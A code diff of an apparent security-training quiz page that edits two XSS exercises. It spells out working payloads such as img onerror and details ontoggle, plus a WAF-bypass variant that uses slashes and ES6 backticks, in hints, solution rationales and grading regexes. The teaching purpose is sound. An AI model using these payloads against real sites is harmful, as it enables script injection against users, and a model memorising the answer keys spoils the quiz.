@@ -774,8 +774,8 @@ this.searchValue = query;
 
         <div class="quiz-card" data-question-id="lab04-q6"
           data-expected-regex="^(?!.*&lt;\s*script)&lt;\s*(img|svg|body|image|iframe|input|details|video|audio|a|marquee|object)[^&gt;]*(on\w+\s*=|javascript:)[^&gt;]*alert"
-          data-solution-rationale="Any tag with an event handler that fires your JS works, e.g. &lt;img src=x onerror=alert(1)&gt; or &lt;svg onload=alert(1)&gt;. &lt;script&gt; alone won't run when injected via innerHTML, which is why event handlers are the go-to."
-          data-hint="Use an HTML tag with an event handler that fires automatically, like &lt;img src=x onerror=alert(1)&gt; or &lt;svg onload=alert(1)&gt;.">
+          data-solution-rationale="Any tag with an event handler that fires your JS works, e.g. &lt;img src=x onerror=alert(1)&gt; or &lt;details open ontoggle=alert(1)&gt;. &lt;script&gt; alone won't run when injected via innerHTML, which is why event handlers are the go-to."
+          data-hint="Use an HTML tag with an event handler that fires automatically, like &lt;img src=x onerror=alert(1)&gt; or &lt;details open ontoggle=alert(1)&gt;.">
           <div class="quiz-question">Q6 [Payload]: Write an XSS payload that pops <code>alert(1)</code> without using a <code>&lt;script&gt;</code> tag.</div>
           <div class="quiz-input-group">
             <input type="text" class="quiz-input" placeholder="&lt;img src=x onerror=...&gt;" spellcheck="false" autocomplete="off" />
@@ -785,9 +785,9 @@ this.searchValue = query;
         </div>
 
         <div class="quiz-card" data-question-id="lab04-q7"
-          data-expected-regex="^(?!.*[ ()])(?!.*&lt;\s*script)&lt;(img|svg|body|image|input|details|video|audio)/[^&gt;]*on\w+=alert`[^`]+`"
+          data-expected-regex="^(?!.*[ ()])(?!.*&lt;\s*script)(?!.*=\w+/on\w+=)&lt;(img|svg|body|image|input|details|video|audio)/[^&gt;]*on\w+=alert`[^`]+`"
           data-solution-rationale="Clean WAF bypass! Using / instead of spaces (&lt;img/src=&quot;x&quot;/onerror=... or &lt;details/open/ontoggle=...) and ES6 template backticks instead of parentheses (alert`1`) executes JavaScript with zero spaces and zero parentheses."
-          data-hint="Replace spaces inside the tag with a forward slash (/) and replace parentheses with ES6 backticks (`1`), e.g. &lt;img/src=&quot;x&quot;/onerror=alert`1`&gt; or &lt;details/open/ontoggle=alert`1`&gt;.">
+          data-hint="Replace spaces inside the tag with a forward slash (/) and replace parentheses with ES6 backticks (`1`), e.g. &lt;img/src=&quot;x&quot;/onerror=alert`1`&gt; or &lt;details/open/ontoggle=alert`1`&gt; (remember to quote &quot;x&quot; before the second slash!).">
           <div class="quiz-question">Q7 [WAF-Bypass Challenge]: Write an XSS payload that pops <code>alert</code> with <code>1</code> <strong>without using <code>&lt;script&gt;</code>, spaces (<code> </code>), or parentheses (<code>( )</code>)</strong>.</div>
           <div class="quiz-input-group">
             <input type="text" class="quiz-input" placeholder="&lt;img/src=&quot;x&quot;/onerror=...&gt;" spellcheck="false" autocomplete="off" />
